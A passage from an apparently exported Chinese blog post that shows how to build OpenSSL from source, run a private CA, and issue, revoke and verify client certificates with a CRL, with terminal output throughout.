2016 GMT\n        CRL extensions:\n            X509v3 CRL Number:\n                1\nRevoked Certificates:\n    Serial Number: 01\n        Revocation Date: Sep  4 07:34:48 2016 GMT\n    Signature Algorithm: sha256WithRSAEncryption\n         a7:98:6c:8f:77:d2:52:6a:57:eb:27:75:6f:17:eb:3c:30:19:\n         78:bb:4f:77:aa:94:74:28:e5:7a:05:38:8d:03:6c:7c:8f:63:\n         de:a9:fd:d3:ed:77:70:7d:24:9a:b9:da:42:05:9b:d1:73:92:\n         6c:0c:13:88:16:16:d7:e1:4f:6f:62:90:8a:11:b1:c5:b7:80:\n         c8:6c:76:e5:d2:eb:a9:f4:ee:da:85:56:9e:f2:97:02:43:ef:\n         3d:ea:77:af:5b:f1:ed:4b:39:c7:7e:9c:22:62:91:ee:17:30:\n         10:d2:49:82:9a:0d:9c:0c:ad:63:1e:cb:30:33:f0:5f:55:dc:\n         b6:6c:70:61:82:ba:e0:d3:98:96:f3:3d:8b:0c:02:0d:fd:ac:\n         61:e5:24:46:a0:52:94:05:f4:a9:a8:8b:25:40:db:a4:e5:58:\n         4f:bd:37:1d:44:87:f1:3f:f9:06:d5:47:aa:0c:8f:1e:ba:d6:\n         99:ef:f7:77:e0:af:05:a3:08:78:06:0f:e2:6a:a4:cd:ac:1a:\n         45:d3:18:9a:18:25:ee:c3:7b:66:51:77:52:64:5e:4a:81:9e:\n         84:be:16:bc:da:7d:83:7b:49:d1:5a:0f:4f:02:e4:fa:fb:80:\n         53:7f:7f:72:02:17:31:25:c6:6e:cc:1e:4f:7e:9c:f4:ae:d1:\n         85:a2:6a:d6\nkey1088@key1088-host:~/openssl-1.1.0$ cat CA/serial\n03\nkey1088@key1088-host:~/openssl-1.1.0$ cat CA/crlnumber\n02\nkey1088@key1088-host:~/openssl-1.1.0$ cat CA/index.txt\nR\t190601065817Z\t160904073448Z\t01\tunknown\t/C=CN/ST=BJ/O=key1088.info/CN=c01\nV\t190601073145Z\t\t02\tunknown\t/C=CN/ST=BJ/O=key1088.info/CN=c02\nkey1088@key1088-host:~/openssl-1.1.0$ cat CA/index.txt.old\nV\t190601065817Z\t\t01\tunknown\t/C=CN/ST=BJ/O=key1088.info/CN=c01\nV\t190601073145Z\t\t02\tunknown\t/C=CN/ST=BJ/O=key1088.info/CN=c02\n</pre>\n5.验证吊销的证书和正常使用的证书\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl  verify -crl_check -CRLfile CA/all.crl -CAfile CA/cacert.pem CA/client/c01.crt\nC = CN, ST = BJ, O = key1088.info, CN = c01\nerror 23 at 0 depth lookup: certificate revoked\nerror CA/client/c01.crt: verification failed\n</pre>\n再新生成一个02的证书验证一下，验证结果。\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl  verify -crl_check -CRLfile CA/all.crl -CAfile CA/cacert.pem CA/client/c02.crt\nCA/client/c02.crt: OK\n参考文章：\nhttp://www.yunweipai.com/archives/4513.html%20r\nhttp://raymii.org/s/articles/OpenSSL_manually_verify_a_certificate_against_a_CRL.html\n","slug":"源码搭建CA服务器,证书可申请、吊销","published":1,"updated":"2023-04-22T05:38:45.107Z","_id":"clgrjlxmz00d47opiflm90vk8","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"现在越来越多的项目在设计的过程中会很注重网络安全，银行金融业和监管机构之间一般采用金融城域网专线连接，在链路上面也使用CA数字证书，一般金融业的CA证书都是CFCA颁发，或者使用制定型号的-加密机。本章主要介绍一下CA服务器的搭建、证书的申请和吊销（也可以自己做加密机），后续有时间会写一下关于程序中怎么使用CA证书进行安全校验的。openssl安装：先来介绍一下openssl的安装，一般LINUX发行版都会自带openssl工具，裁剪系统中一般自己来编译安装。我们的编译和测试环境如下：key1088-key1088-host-uname-aLinux-key1088-host-4-4-0-36-generic-55-Ubuntu-SMP-Thu-Aug-11-18-01-55-UTC-2016-x86-64-x86-64-x86-64-GNU-Linuxkey1088-key1088-host-gcc-versiongcc-Ubuntu-5-4-0-6ubuntu116-04-2-5-4-0-20160609Copyright-C-2015-Free-Software-Foundation-Inc-This-is-free-software-see-the-source-for-copying-conditions-There-is-NOwarranty-not-even-for-MERCHANTABILITY-or-FITNESS-FOR-A-PARTICULAR-PURPOSE-1-下载openssl源代码https-www-openssl-org-wget-https-www-openssl-org-source-openssl-1-1-0-tar-gz2-编译安装tar-xvf-openssl-1-1-0-tar-gzcd-openssl-1-1-0-configmake咱们这次就不make-install了，就在这个目录下面操作了，需要临时设置一下环境变量这个版本默认编译出来静态bin文件在apps下面-rw-rw-r-1-key1088-key1088-911-9月-4-13-49-x509-d-rwxrwxr-x-1-key1088-key1088-680616-9月-4-13-49-openssl-rwxrwxr-x-1-key1088-key1088-6755-9月-4-13-50-CA-pl-rwxrwxr-x-1-key1088-key1088-6613-9月-4-13-50-tsget3-环境变量设置key1088-key1088-host-openssl-1-1-0-apps-openssl-version-openssl-error-while-loading-shared-libraries-libssl-so-1-1-cannot-open-shared-object-file-No-such-file-or-directorykey1088-key1088-host-openssl-1-1-0-apps-LD-LIBRARY-PATH-LD-LIBRARY-PATH-HOME-openssl-1-1-0key1088-key1088-host-openssl-1-1-0-apps-export-LD-LIBRARY-PATHkey1088-key1088-host-openssl-1-1-0-apps-openssl-versionOpenSSL-1-1-0-25-Aug-2016出现版本号就证明环境变量设置正确，openssl可以用了。CA服务器证书生成：CA（Certificate-Authority）证书颁发机构主要负责证书的颁发、管理以及归档和吊销。证书内包含了拥有证书者的姓名、地址、电子邮件帐号、公钥、证书有效期、发放证书的CA、CA的数字签名等信息。证书主要有三大功能：加密、签名、身份验证。所有的操作默认在openssl-1-1-0目录下进行2-生成CA密钥mkdir-p-CA-privatekey1088-key1088-host-openssl-1-1-0-umask-077-apps-openssl-genrsa-out-CA-private-cakey-pem-2048-Generating-RSA-private-key-2048-bit-long-modulus-unable-to-write-random-state-e-is-65537-0x010001-如果出现这个“unable-to-write-‘random-state’”设置一下环境变量即可key1088-key1088-host-openssl-1-1-0-export-RANDFILE-HOME-rndkey1088-key1088-host-openssl-1-1-0-umask-077-apps-openssl-genrsa-out-CA-private-cakey-pem-2048-Generating-RSA-private-key-2048-bit-long-modulus-e-is-65537-0x010001-2-生成自签名证书创建配置文件目录mkdir-etccp-apps-openssl-cnf-etc为了简化证书制作过程中的输入-修改了etc-x2F-openssl-cnf，修改对比内容如下key1088-key1088-host-openssl-1-1-0-diff-etc-openssl-cnf-apps-openssl-cnf42c42-dir-CA-Where-everything-is-kept\"><a href=\"#现在越来越多的项目在设计的过程中会很注重网络安全，银行金融业和监管机构之间一般采用金融城域网专线连接，在链路上面也使用CA数字证书，一般金融业的CA证书都是CFCA颁发，或者使用制定型号的-加密机。本章主要介绍一下CA服务器的搭建、证书的申请和吊销（也可以自己做加密机），后续有时间会写一下关于程序中怎么使用CA证书进行安全校验的。openssl安装：先来介绍一下openssl的安装，一般LINUX发行版都会自带openssl工具，裁剪系统中一般自己来编译安装。我们的编译和测试环境如下：key1088-key1088-host-uname-aLinux-key1088-host-4-4-0-36-generic-55-Ubuntu-SMP-Thu-Aug-11-18-01-55-UTC-2016-x86-64-x86-64-x86-64-GNU-Linuxkey1088-key1088-host-gcc-versiongcc-Ubuntu-5-4-0-6ubuntu116-04-2-5-4-0-20160609Copyright-C-2015-Free-Software-Foundation-Inc-This-is-free-software-see-the-source-for-copying-conditions-There-is-NOwarranty-not-even-for-MERCHANTABILITY-or-FITNESS-FOR-A-PARTICULAR-PURPOSE-1-下载openssl源代码https-www-openssl-org-wget-https-www-openssl-org-source-openssl-1-1-0-tar-gz2-编译安装tar-xvf-openssl-1-1-0-tar-gzcd-openssl-1-1-0-configmake咱们这次就不make-install了，就在这个目录下面操作了，需要临时设置一下环境变量这个版本默认编译出来静态bin文件在apps下面-rw-rw-r-1-key1088-key1088-911-9月-4-13-49-x509-d-rwxrwxr-x-1-key1088-key1088-680616-9月-4-13-49-openssl-rwxrwxr-x-1-key1088-key1088-6755-9月-4-13-50-CA-pl-rwxrwxr-x-1-key1088-key1088-6613-9月-4-13-50-tsget3-环境变量设置key1088-key1088-host-openssl-1-1-0-apps-openssl-version-openssl-error-while-loading-shared-libraries-libssl-so-1-1-cannot-open-shared-object-file-No-such-file-or-directorykey1088-key1088-host-openssl-1-1-0-apps-LD-LIBRARY-PATH-LD-LIBRARY-PATH-HOME-openssl-1-1-0key1088-key1088-host-openssl-1-1-0-apps-export-LD-LIBRARY-PATHkey1088-key1088-host-openssl-1-1-0-apps-openssl-versionOpenSSL-1-1-0-25-Aug-2016出现版本号就证明环境变量设置正确，openssl可以用了。CA服务器证书生成：CA（Certificate-Authority）证书颁发机构主要负责证书的颁发、管理以及归档和吊销。证书内包含了拥有证书者的姓名、地址、电子邮件帐号、公钥、证书有效期、发放证书的CA、CA的数字签名等信息。证书主要有三大功能：加密、签名、身份验证。所有的操作默认在openssl-1-1-0目录下进行2-生成CA密钥mkdir-p-CA-privatekey1088-key1088-host-openssl-1-1-0-umask-077-apps-openssl-genrsa-out-CA-private-cakey-pem-2048-Generating-RSA-private-key-2048-bit-long-modulus-unable-to-write-random-state-e-is-65537-0x010001-如果出现这个“unable-to-write-‘random-state’”设置一下环境变量即可key1088-key1088-host-openssl-1-1-0-export-RANDFILE-HOME-rndkey1088-key1088-host-openssl-1-1-0-umask-077-apps-openssl-genrsa-out-CA-private-cakey-pem-2048-Generating-RSA-private-key-2048-bit-long-modulus-e-is-65537-0x010001-2-生成自签名证书创建配置文件目录mkdir-etccp-apps-openssl-cnf-etc为了简化证书制作过程中的输入-修改了etc-x2F-openssl-cnf，修改对比内容如下key1088-key1088-host-openssl-1-1-0-diff-etc-openssl-cnf-apps-openssl-cnf42c42-dir-CA-Where-everything-is-kept\" class=\"headerlink\" title=\"现在越来越多的项目在设计的过程中会很注重网络安全，银行金融业和监管机构之间一般采用金融城域网专线连接，在链路上面也使用CA数字证书，一般金融业的CA证书都是CFCA颁发，或者使用制定型号的 加密机。本章主要介绍一下CA服务器的搭建、证书的申请和吊销（也可以自己做加密机），后续有时间会写一下关于程序中怎么使用CA证书进行安全校验的。openssl安装：先来介绍一下openssl的安装，一般LINUX发行版都会自带openssl工具，裁剪系统中一般自己来编译安装。我们的编译和测试环境如下：key1088@key1088-host:$ uname -aLinux key1088-host 4.4.0-36-generic #55-Ubuntu SMP Thu Aug 11 18:01:55 UTC 2016 x86_64 x86_64 x86_64 GNU/Linuxkey1088@key1088-host:$ gcc --versiongcc (Ubuntu 5.4.0-6ubuntu116.04.2) 5.4.0 20160609Copyright (C) 2015 Free Software Foundation, Inc.This is free software; see the source for copying conditions.  There is NOwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.1.下载openssl源代码https://www.openssl.org/wget https://www.openssl.org/source/openssl-1.1.0.tar.gz2.编译安装tar xvf openssl-1.1.0.tar.gzcd openssl-1.1.0./configmake咱们这次就不make install了，就在这个目录下面操作了，需要临时设置一下环境变量这个版本默认编译出来静态bin文件在apps下面-rw-rw-r-- 1 key1088 key1088    911 9月   4 13:49 x509.d-rwxrwxr-x 1 key1088 key1088 680616 9月   4 13:49 openssl-rwxrwxr-x 1 key1088 key1088   6755 9月   4 13:50 CA.pl-rwxrwxr-x 1 key1088 key1088   6613 9月   4 13:50 tsget3.环境变量设置key1088@key1088-host:/openssl-1.1.0/apps$ ./openssl version./openssl: error while loading shared libraries: libssl.so.1.1: cannot open shared object file: No such file or directorykey1088@key1088-host:/openssl-1.1.0/apps$ LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$HOME/openssl-1.1.0key1088@key1088-host:/openssl-1.1.0/apps$ export LD_LIBRARY_PATHkey1088@key1088-host:/openssl-1.1.0/apps$ ./openssl versionOpenSSL 1.1.0  25 Aug 2016出现版本号就证明环境变量设置正确，openssl可以用了。CA服务器证书生成：CA（Certificate Authority）证书颁发机构主要负责证书的颁发、管理以及归档和吊销。证书内包含了拥有证书者的姓名、地址、电子邮件帐号、公钥、证书有效期、发放证书的CA、CA的数字签名等信息。证书主要有三大功能：加密、签名、身份验证。所有的操作默认在openssl-1.1.0目录下进行2.生成CA密钥mkdir -p CA/privatekey1088@key1088-host:/openssl-1.1.0$ (umask 077;./apps/openssl genrsa -out CA/private/cakey.pem 2048)Generating RSA private key, 2048 bit long modulus.................................+++..........+++unable to write 'random state'e is 65537 (0x010001)如果出现这个“unable to write ‘random state’”设置一下环境变量即可key1088@key1088-host:/openssl-1.1.0$ export RANDFILE=$HOME/.rndkey1088@key1088-host:/openssl-1.1.0$ (umask 077;./apps/openssl genrsa -out CA/private/cakey.pem 2048)Generating RSA private key, 2048 bit long modulus.................................+++.....................................................................................+++e is 65537 (0x010001)2.生成自签名证书创建配置文件目录mkdir etccp apps/openssl.cnf etc为了简化证书制作过程中的输入 修改了etc&#x2F;openssl.cnf，修改对比内容如下key1088@key1088-host:~/openssl-1.1.0$ diff etc/openssl.cnf apps/openssl.cnf42c42< dir\t\t= ./CA\t\t# Where everything is kept\"></a>现在越来越多的项目在设计的过程中会很注重网络安全，银行金融业和监管机构之间一般采用金融城域网专线连接，在链路上面也使用CA数字证书，一般金融业的CA证书都是CFCA颁发，或者使用制定型号的 加密机。本章主要介绍一下CA服务器的搭建、证书的申请和吊销（也可以自己做加密机），后续有时间会写一下关于程序中怎么使用CA证书进行安全校验的。<br><strong>openssl安装：<br></strong><br>先来介绍一下openssl的安装，一般LINUX发行版都会自带openssl工具，裁剪系统中一般自己来编译安装。<br>我们的编译和测试环境如下：<br><pre><br>key1088@key1088-host:<del>$ uname -a<br>Linux key1088-host 4.4.0-36-generic #55-Ubuntu SMP Thu Aug 11 18:01:55 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux<br>key1088@key1088-host:</del>$ gcc --version<br>gcc (Ubuntu 5.4.0-6ubuntu1<del>16.04.2) 5.4.0 20160609<br>Copyright (C) 2015 Free Software Foundation, Inc.<br>This is free software; see the source for copying conditions.  There is NO<br>warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.<br></pre><br>1.下载openssl源代码<br><a href=\"https://www.openssl.org/\">https://www.openssl.org/</a><br><pre><br>wget <a href=\"https://www.openssl.org/source/openssl-1.1.0.tar.gz\">https://www.openssl.org/source/openssl-1.1.0.tar.gz</a><br></pre><br>2.编译安装<br><pre><br>tar xvf openssl-1.1.0.tar.gz<br>cd openssl-1.1.0<br>./config<br>make<br></pre><br>咱们这次就不make install了，就在这个目录下面操作了，需要临时设置一下环境变量<br>这个版本默认编译出来静态bin文件在apps下面<br><pre><br>-rw-rw-r-- 1 key1088 key1088    911 9月   4 13:49 x509.d<br>-rwxrwxr-x 1 key1088 key1088 680616 9月   4 13:49 openssl<br>-rwxrwxr-x 1 key1088 key1088   6755 9月   4 13:50 CA.pl<br>-rwxrwxr-x 1 key1088 key1088   6613 9月   4 13:50 tsget<br></pre><br>3.环境变量设置<br><pre><br>key1088@key1088-host:</del>/openssl-1.1.0/apps$ ./openssl version<br>./openssl: error while loading shared libraries: libssl.so.1.1: cannot open shared object file: No such file or directory<br>key1088@key1088-host:<del>/openssl-1.1.0/apps$ LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$HOME/openssl-1.1.0<br>key1088@key1088-host:</del>/openssl-1.1.0/apps$ export LD_LIBRARY_PATH<br>key1088@key1088-host:<del>/openssl-1.1.0/apps$ ./openssl versionOpenSSL 1.1.0  25 Aug 2016<br></pre><br>出现版本号就证明环境变量设置正确，openssl可以用了。<br><strong><br>CA服务器证书生成：<br></strong><br>CA（Certificate Authority）证书颁发机构主要负责证书的颁发、管理以及归档和吊销。证书内包含了拥有证书者的姓名、地址、电子邮件帐号、公钥、证书有效期、发放证书的CA、CA的数字签名等信息。证书主要有三大功能：加密、签名、身份验证。<br>所有的操作默认在openssl-1.1.0目录下进行<br>2.生成CA密钥<br><pre><br>mkdir -p CA/private<br>key1088@key1088-host:</del>/openssl-1.1.0$ (umask 077;./apps/openssl genrsa -out CA/private/cakey.pem 2048)<br>Generating RSA private key, 2048 bit long modulus<br>.................................+++<br>..........+++<br>unable to write 'random state'<br>e is 65537 (0x010001)<br></pre><br>如果出现这个“unable to write ‘random state’”设置一下环境变量即可<br><pre><br>key1088@key1088-host:<del>/openssl-1.1.0$ export RANDFILE=$HOME/.rnd<br>key1088@key1088-host:</del>/openssl-1.1.0$ (umask 077;./apps/openssl genrsa -out CA/private/cakey.pem 2048)<br>Generating RSA private key, 2048 bit long modulus<br>.................................+++<br>.....................................................................................+++<br>e is 65537 (0x010001)<br></pre><br>2.生成自签名证书<br>创建配置文件目录<br><pre><br>mkdir etc<br>cp apps/openssl.cnf etc<br></pre><br>为了简化证书制作过程中的输入 修改了etc&#x2F;openssl.cnf，修改对比内容如下<br><pre><br>key1088@key1088-host:~/openssl-1.1.0$ diff etc/openssl.cnf apps/openssl.cnf<br>42c42<br>< dir\t\t= ./CA\t\t# Where everything is kept</h2><blockquote>\n<p>dir\t\t= ./demoCA\t\t# Where everything is kept<br>129c129<br>< countryName_default\t\t= CN</p>\n</blockquote>\n<hr>\n<blockquote>\n<p>countryName_default\t\t= AU<br>134c134<br>< stateOrProvinceName_default\t= BJ</p>\n</blockquote>\n<hr>\n<blockquote>\n<p>stateOrProvinceName_default\t= Some-State<br>139c139<br>< 0.organizationName_default\t= key1088.info</p>\n</blockquote>\n<hr>\n<blockquote>\n<p>0.organizationName_default\t= Internet Widgits Pty Ltd<br>151c151<br>< emailAddress\t\t\t= <a href=\"mailto:&#107;&#101;&#121;&#x31;&#48;&#56;&#56;&#x40;&#x31;&#x36;&#x33;&#46;&#99;&#111;&#109;\">&#107;&#101;&#121;&#x31;&#48;&#56;&#56;&#x40;&#x31;&#x36;&#x33;&#46;&#99;&#111;&#109;</a></p>\n</blockquote>\n<hr>\n<blockquote>\n<p>emailAddress\t\t\t= Email Address<br></pre><br>根据密钥生存证书</p>\n</blockquote>\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl req -new -x509 -key CA/private/cakey.pem -out CA/cacert.pem -days 1000 -config etc/openssl.cnf\nYou are about to be asked to enter information that will be incorporated\ninto your certificate request.\nWhat you are about to enter is what is called a Distinguished Name or a DN.\nThere are quite a few fields but you can leave some blank\nFor some fields there will be a default value,\nIf you enter '.', the field will be left blank.\n-----\nCountry Name (2 letter code) [CN]:\nState or Province Name (full name) [BJ]:\nLocality Name (eg, city) []:\nOrganization Name (eg, company) [key1088.info]:\nOrganizational Unit Name (eg, section) []:\nCommon Name (e.g. server FQDN or YOUR name) []:key1088\nkey1088@163.com []:\n</pre>\n<h2 id=\"创建CA服务器所需文件key1088-key1088-host-openssl-1-1-0-touch-CA-index-txt-serial-key1088-key1088-host-openssl-1-1-0-ls-l-CA-总用量-8-rw-rw-r-1-key1088-key1088-1176-9月-4-14-07-cacert-pem-rw-rw-r-1-key1088-key1088-0-9月-4-14-09-index-txtdrwxrwxr-x-2-key1088-key1088-4096-9月-4-13-57-private-rw-rw-r-1-key1088-key1088-0-9月-4-14-09-serial证书序号开始值设置key1088-key1088-host-openssl-1-1-0-echo-01-CA-serial3-生成客户端证书，也称为节点证书。key1088-key1088-host-openssl-1-1-0-umask-077-apps-openssl-genrsa-out-CA-client-c01-key-2048-Generating-RSA-private-key-2048-bit-long-modulus-e-is-65537-0x10001-key1088-key1088-host-openssl-1-1-0-apps-openssl-req-new-key-CA-client-c01-key-out-CA-client-c01-csr-config-etc-openssl-cnfYou-are-about-to-be-asked-to-enter-information-that-will-be-incorporatedinto-your-certificate-request-What-you-are-about-to-enter-is-what-is-called-a-Distinguished-Name-or-a-DN-There-are-quite-a-few-fields-but-you-can-leave-some-blankFor-some-fields-there-will-be-a-default-value-If-you-enter-the-field-will-be-left-blank\"><a href=\"#创建CA服务器所需文件key1088-key1088-host-openssl-1-1-0-touch-CA-index-txt-serial-key1088-key1088-host-openssl-1-1-0-ls-l-CA-总用量-8-rw-rw-r-1-key1088-key1088-1176-9月-4-14-07-cacert-pem-rw-rw-r-1-key1088-key1088-0-9月-4-14-09-index-txtdrwxrwxr-x-2-key1088-key1088-4096-9月-4-13-57-private-rw-rw-r-1-key1088-key1088-0-9月-4-14-09-serial证书序号开始值设置key1088-key1088-host-openssl-1-1-0-echo-01-CA-serial3-生成客户端证书，也称为节点证书。key1088-key1088-host-openssl-1-1-0-umask-077-apps-openssl-genrsa-out-CA-client-c01-key-2048-Generating-RSA-private-key-2048-bit-long-modulus-e-is-65537-0x10001-key1088-key1088-host-openssl-1-1-0-apps-openssl-req-new-key-CA-client-c01-key-out-CA-client-c01-csr-config-etc-openssl-cnfYou-are-about-to-be-asked-to-enter-information-that-will-be-incorporatedinto-your-certificate-request-What-you-are-about-to-enter-is-what-is-called-a-Distinguished-Name-or-a-DN-There-are-quite-a-few-fields-but-you-can-leave-some-blankFor-some-fields-there-will-be-a-default-value-If-you-enter-the-field-will-be-left-blank\" class=\"headerlink\" title=\"创建CA服务器所需文件key1088@key1088-host:/openssl-1.1.0$ touch CA/{index.txt,serial}key1088@key1088-host:/openssl-1.1.0$ ls -l CA/总用量 8-rw-rw-r-- 1 key1088 key1088 1176 9月   4 14:07 cacert.pem-rw-rw-r-- 1 key1088 key1088    0 9月   4 14:09 index.txtdrwxrwxr-x 2 key1088 key1088 4096 9月   4 13:57 private-rw-rw-r-- 1 key1088 key1088    0 9月   4 14:09 serial证书序号开始值设置key1088@key1088-host:/openssl-1.1.0$ echo \"01\" > CA/serial3.生成客户端证书，也称为节点证书。key1088@key1088-host:/openssl-1.1.0$ (umask 077;./apps/openssl genrsa -out CA/client/c01.key 2048)Generating RSA private key, 2048 bit long modulus............+++................................................................................................+++e is 65537 (0x10001)key1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl req -new -key CA/client/c01.key -out CA/client/c01.csr -config etc/openssl.cnfYou are about to be asked to enter information that will be incorporatedinto your certificate request.What you are about to enter is what is called a Distinguished Name or a DN.There are quite a few fields but you can leave some blankFor some fields there will be a default value,If you enter '.', the field will be left blank.\"></a>创建CA服务器所需文件<br><pre><br>key1088@key1088-host:<del>/openssl-1.1.0$ touch CA/{index.txt,serial}<br>key1088@key1088-host:</del>/openssl-1.1.0$ ls -l CA/<br>总用量 8<br>-rw-rw-r-- 1 key1088 key1088 1176 9月   4 14:07 cacert.pem<br>-rw-rw-r-- 1 key1088 key1088    0 9月   4 14:09 index.txt<br>drwxrwxr-x 2 key1088 key1088 4096 9月   4 13:57 private<br>-rw-rw-r-- 1 key1088 key1088    0 9月   4 14:09 serial<br></pre><br>证书序号开始值设置<br><pre><br>key1088@key1088-host:<del>/openssl-1.1.0$ echo \"01\" > CA/serial<br></pre><br>3.生成客户端证书，也称为节点证书。<br><pre><br>key1088@key1088-host:</del>/openssl-1.1.0$ (umask 077;./apps/openssl genrsa -out CA/client/c01.key 2048)<br>Generating RSA private key, 2048 bit long modulus<br>............+++<br>................................................................................................+++<br>e is 65537 (0x10001)<br>key1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl req -new -key CA/client/c01.key -out CA/client/c01.csr -config etc/openssl.cnf<br>You are about to be asked to enter information that will be incorporated<br>into your certificate request.<br>What you are about to enter is what is called a Distinguished Name or a DN.<br>There are quite a few fields but you can leave some blank<br>For some fields there will be a default value,<br>If you enter '.', the field will be left blank.</h2><p>Country Name (2 letter code) [CN]:<br>State or Province Name (full name) [BJ]:<br>Locality Name (eg, city) []:<br>Organization Name (eg, company) [key1088.info]:<br>Organizational Unit Name (eg, section) []:<br>Common Name (e.g. server FQDN or YOUR name) []:c01\t\t#此处不能和CA中的名称相同<br><a href=\"mailto:&#107;&#x65;&#121;&#49;&#x30;&#56;&#x38;&#x40;&#49;&#x36;&#51;&#46;&#x63;&#111;&#x6d;\">&#107;&#x65;&#121;&#49;&#x30;&#56;&#x38;&#x40;&#49;&#x36;&#51;&#46;&#x63;&#111;&#x6d;</a> []:<br>Please enter the following 'extra' attributes<br>to be sent with your certificate request<br>A challenge password []:1234<br>An optional company name []:1234<br></pre><br>4.部署到CA中</p>\n<pre>\nmkdir -p CA/newcerts\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl ca -in CA/client/c01.csr -out CA/client/c01.crt -days 1000 -config etc/openssl.cnf\nUsing configuration from etc/openssl.cnf\nCan't open ./CA/index.txt.attr for reading, No such file or directory\n140399448418048:error:02001002:system library:fopen:No such file or directory:crypto/bio/bss_file.c:74:fopen('./CA/index.txt.attr','r')\n140399448418048:error:2006D080:BIO routines:BIO_new_file:no such file:crypto/bio/bss_file.c:77:\nCheck that the request matches the signature\nSignature ok\nCertificate Details:\n        Serial Number: 1 (0x1)\n        Validity\n            Not Before: Sep  4 06:58:17 2016 GMT\n            Not After : Jun  1 06:58:17 2019 GMT\n        Subject:\n            countryName               = CN\n            stateOrProvinceName       = BJ\n            organizationName          = key1088.info\n            commonName                = c01\n        X509v3 extensions:\n            X509v3 Basic Constraints:\n                CA:FALSE\n            Netscape Comment:\n                OpenSSL Generated Certificate\n            X509v3 Subject Key Identifier:\n                AB:F4:CB:4F:13:28:F8:5D:A7:DB:A0:E3:F3:52:86:C1:25:D1:EB:A0\n            X509v3 Authority Key Identifier:\n                keyid:68:82:F2:71:02:9C:92:00:F4:05:72:30:24:97:6B:80:2E:69:AF:EA\nCertificate is to be certified until Jun  1 06:58:17 2019 GMT (1000 days)\nSign the certificate? [y/n]:y\n1 out of 1 certificate requests certified, commit? [y/n]y\nWrite out database with 1 new entries\nData Base Updated\nkey1088@key1088-host:~/openssl-1.1.0$ du -a CA/\n8\tCA/newcerts/01.pem\t\t        #自动生成的PEM文件，按照序号命名\n12\tCA/newcerts\n4\tCA/private/cakey.pem\n8\tCA/private\n4\tCA/serial\n4\tCA/serial.old\n0\tCA/index.txt.old\n4\tCA/cacert.pem\n4\tCA/index.txt\n8\tCA/client/c01.crt\t\t\t#生成的证书\n4\tCA/client/c01.key\n4\tCA/client/c01.csr\n20\tCA/client\n4\tCA/index.txt.attr\n64\tCA/\n</pre>\n<p>openssl自带的样例：<br>openssl-1.1.0&#x2F;apps&#x2F;demoCA&#x2F;下面的内容<br>5.转换给pfx格式（可选）</p>\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl pkcs12 -export -clcerts -in CA/client/c01.crt -inkey CA/client/c01.key -out CA/client/c01.pfx\nEnter Export Password:\t\t\t\t\t#12345678\nVerifying - Enter Export Password:\t\t#同上\n</pre>\n<p>pfx文件包含数字签名证书和私钥，可以进行密钥转移，也可以导入到浏览器中查看。<br>6.验证证书是否正确</p>\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl verify -CAfile CA/cacert.pem  CA/client/c01.crt\nCA/client/c01.crt: OK\n</pre>\n<p><strong>吊销证书<br></strong><br>1.查看客户端证书序号</p>\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl x509 -in CA/client/c01.crt -noout -serial -subject\nserial=01\nsubject=C = CN, ST = BJ, O = key1088.info, CN = c01\n</pre>\n<p>2.吊销证书</p>\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl ca -revoke CA/newcerts/01.pem -config etc/openssl.cnf\nUsing configuration from etc/openssl.cnf\nRevoking Certificate 01.\nData Base Updated\n</pre>\n<p>3.生成吊销列表</p>\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ echo \"01\" > CA/crlnumber\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl ca -gencrl -out CA/all.crl -config etc/openssl.cnf\nUsing configuration from etc/openssl.cnf\n</pre>\n<p>4.查看吊销</p>\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl crl -in CA/all.crl -noout -text\nCertificate Revocation List (CRL):\n        Version 2 (0x1)\n    Signature Algorithm: sha256WithRSAEncryption\n        Issuer: /C=CN/ST=BJ/O=key1088.info/CN=key1088\n        Last Update: Sep  4 07:37:17 2016 GMT\n        Next Update: Oct  4 07:37:17 2016 GMT\n        CRL extensions:\n            X509v3 CRL Number:\n                1\nRevoked Certificates:\n    Serial Number: 01\n        Revocation Date: Sep  4 07:34:48 2016 GMT\n    Signature Algorithm: sha256WithRSAEncryption\n         a7:98:6c:8f:77:d2:52:6a:57:eb:27:75:6f:17:eb:3c:30:19:\n         78:bb:4f:77:aa:94:74:28:e5:7a:05:38:8d:03:6c:7c:8f:63:\n         de:a9:fd:d3:ed:77:70:7d:24:9a:b9:da:42:05:9b:d1:73:92:\n         6c:0c:13:88:16:16:d7:e1:4f:6f:62:90:8a:11:b1:c5:b7:80:\n         c8:6c:76:e5:d2:eb:a9:f4:ee:da:85:56:9e:f2:97:02:43:ef:\n         3d:ea:77:af:5b:f1:ed:4b:39:c7:7e:9c:22:62:91:ee:17:30:\n         10:d2:49:82:9a:0d:9c:0c:ad:63:1e:cb:30:33:f0:5f:55:dc:\n         b6:6c:70:61:82:ba:e0:d3:98:96:f3:3d:8b:0c:02:0d:fd:ac:\n         61:e5:24:46:a0:52:94:05:f4:a9:a8:8b:25:40:db:a4:e5:58:\n         4f:bd:37:1d:44:87:f1:3f:f9:06:d5:47:aa:0c:8f:1e:ba:d6:\n         99:ef:f7:77:e0:af:05:a3:08:78:06:0f:e2:6a:a4:cd:ac:1a:\n         45:d3:18:9a:18:25:ee:c3:7b:66:51:77:52:64:5e:4a:81:9e:\n         84:be:16:bc:da:7d:83:7b:49:d1:5a:0f:4f:02:e4:fa:fb:80:\n         53:7f:7f:72:02:17:31:25:c6:6e:cc:1e:4f:7e:9c:f4:ae:d1:\n         85:a2:6a:d6\nkey1088@key1088-host:~/openssl-1.1.0$ cat 